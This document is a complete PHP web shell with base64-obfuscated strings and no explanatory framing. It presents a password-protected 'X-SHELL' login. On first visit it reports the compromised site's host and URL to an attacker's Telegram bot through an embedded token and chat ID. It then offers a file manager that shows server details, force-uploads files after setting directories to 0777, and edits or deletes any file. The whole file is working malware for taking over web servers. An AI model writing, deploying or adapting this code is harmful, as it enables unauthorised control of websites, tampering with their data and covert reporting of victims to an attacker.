<?php
error_reporting(0);
set_time_limit(0);
session_start();
$k = "a2Vt";
$password = base64_decode($k);
if (isset($_GET["logout"])) {
    unset($_SESSION["login"]);
    header("Location: ?");
}
if (!isset($_SESSION["login"])) {
    if (isset($_POST["pass"]) && $_POST["pass"] == $password) {
        $_SESSION["login"] = true;
    } else {
        die(
            base64_decode(
                "PGJvZHkgc3R5bGU9J2JhY2tncm91bmQ6IzAwMDtjb2xvcjpyZWQ7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZy10b3A6MTAwcHg7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2ZvbnQtc2l6ZToxOHB4Oyc+PGZvcm0gbWV0aG9kPSdwb3N0Jz48aDE+WyBYLVNIRUxMIExPR0lOIF08L2gxPjxpbnB1dCB0eXBlPSdwYXNzd29yZCcgbmFtZT0ncGFzcycgc3R5bGU9J2JhY2tncm91bmQ6IzExMTtjb2xvcjojMGYwO2JvcmRlcjoxcHggc29saWQgcmVkO2ZvbnQtc2l6ZToxOHB4O3BhZGRpbmc6NXB4Oyc+PGJyPjxicj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nRU5URVInIHN0eWxlPSdmb250LXNpemU6MThweDtwYWRkaW5nOjVweCAxNXB4Oyc+PC9mb3JtPjwvYm9keT4="
            )
        );
    }
}
$tk = base64_decode(
    "ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ=="
);
$cid = base64_decode("ODkzMDE3NDQ2Mw==");
function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram(base64_decode("a29udG9sYmVuZ2thazo=") . "\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
$path = isset($_GET["path"]) ? $_GET["path"] : getcwd();
$path = str_replace("\\", "/", $path);
$os = strtoupper(substr(PHP_OS, 0, 3)) === "WIN" ? "Windows" : "Linux";
echo base64_decode(
    "PHN0eWxlPmJvZHl7YmFja2dyb3VuZDojMDAwO2NvbG9yOiMwZjA7Zm9udC1mYW1pbHk6J0NvdXJpZXIgTmV3Jyxtb25vc3BhY2U7Zm9udC1zaXplOjE4cHg7cGFkZGluZzoyMHB4O30uYm94e2JvcmRlcjoxcHggc29saWQgcmVkO3BhZGRpbmc6MTJweDttYXJnaW4tYm90dG9tOjEycHg7YmFja2dyb3VuZDpyZ2JhKDEwLDEwLDEwLDAuOSk7Ym94LXNoYWRvdzowIDAgNXB4IHJlZDt9YXtjb2xvcjpjeWFuO3RleHQtZGVjb3JhdGlvbjpub25lO31hOmhvdmVye2NvbG9yOnJlZDt9dGFibGV7d2lkdGg6MTAwJTtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7fXRoLHRke2JvcmRlcjoxcHggc29saWQgIzMzMztwYWRkaW5nOjhweDt0ZXh0LWFsaWduOmxlZnQ7fXRoe2JhY2tncm91bmQ6cmVkO2NvbG9yOiMwMDA7fWlucHV0LHRleHRhcmVhe2JhY2tncm91bmQ6IzExMTtjb2xvcjojMGYwO2JvcmRlcjoxcHggc29saWQgIzQ0NDtwYWRkaW5nOjZweDtmb250LXNpemU6MThweDtmb250LWZhbWlseTptb25vc3BhY2U7fS5idG57YmFja2dyb3VuZDpyZWQ7Y29sb3I6I2ZmZjtib3JkZXI6bm9uZTtjdXJzb3I6cG9pbnRlcjtwYWRkaW5nOjZweCAxNXB4O2ZvbnQtc2l6ZToxOHB4O308L3N0eWxlPg=="
);
echo "<h2>[ 1337 ]</h2>";
echo "<div class='box'>OS: $os | IP: {$_SERVER["SERVER_ADDR"]} | USER: " .
    get_current_user() .
    " | <a href='?logout=1'>[ LOGOUT ]</a></div>";
echo "<div class='box'>PATH: ";
$ps = explode("/", $path);
foreach ($ps as $id => $p) {
    echo "<a href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $ps[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>$p</a>/";
}
echo "</div>";
echo "<div class='box'><form method='POST' enctype='multipart/form-data'><b>" .
    base64_decode("QllQQVNTIFVQTE9BRA==") .
    ":</b> <input type='file' name='f'> <input type='submit' name='up' value='" .
    base64_decode("Rk9SQ0UgVVA=") .
    "' class='btn'></form></div>";
if (isset($_POST["up"])) {
    $d = $path . "/" . $_FILES["f"]["name"];
    @chmod($path, 0777);
    if (
        @copy($_FILES["f"]["tmp_name"], $d) ||
        @move_uploaded_file($_FILES["f"]["tmp_name"], $d) ||
        @file_put_contents($d, file_get_contents($_FILES["f"]["tmp_name"]))
    ) {
        echo "<font color='lime'>" .
            base64_decode("WytdIFNVQ0NFU1M6IA==") .
            basename($d) .
            " (" .
            filesize($d) .
            " B)</font>";
    } else {
        echo "<font color='red'>" .
            base64_decode("Wy1dIEZBSUxFRCE=") .
            "</font>";
    }
}
echo "<table><tr><th>" .
    base64_decode("TkFNRQ==") .
    "</th><th>" .
    base64_decode("U0laRQ==") .
    "</th><th>" .
    base64_decode("QUNU") .
    "</th></tr>";
foreach (scandir($path) as $i) {
    if ($i == "." || $i == "..") {
        continue;
    }
    $f = $path . "/" . $i;
    $is_d = is_dir($f);
    echo "<tr><td>" .
        ($is_d ? "<a href='?path=$f'>[ $i ]</a>" : $i) .
        "</td><td>" .
        ($is_d ? "DIR" : filesize($f) . " B") .
        "</td><td><a href='?path=$path&act=edit&item=$f'>" .
        base64_decode("RWRpdA==") .
        "</a> | <a href='?path=$path&act=del&item=$f'>" .
        base64_decode("RGVs") .
        "</a></td></tr>";
}
echo "</table>";
if ($_GET["act"] == "edit") {
    if (isset($_POST["s"])) {
        @file_put_contents($_GET["item"], $_POST["t"]);
        echo base64_decode("U0FWRUQh");
    }
    echo "<div class='box'><form method='POST'><textarea name='t' style='width:100%;height:300px;'>" .
        htmlspecialchars(file_get_contents($_GET["item"])) .
        "</textarea><br><input type='submit' name='s' value='" .
        base64_decode("U0FWRQ==") .
        "' class='btn'></form></div>";
}
if ($_GET["act"] == "del") {
    @is_dir($_GET["item"]) ? @rmdir($_GET["item"]) : @unlink($_GET["item"]);
    echo "<script>window.location='?path=$path';</script>";
}
?>
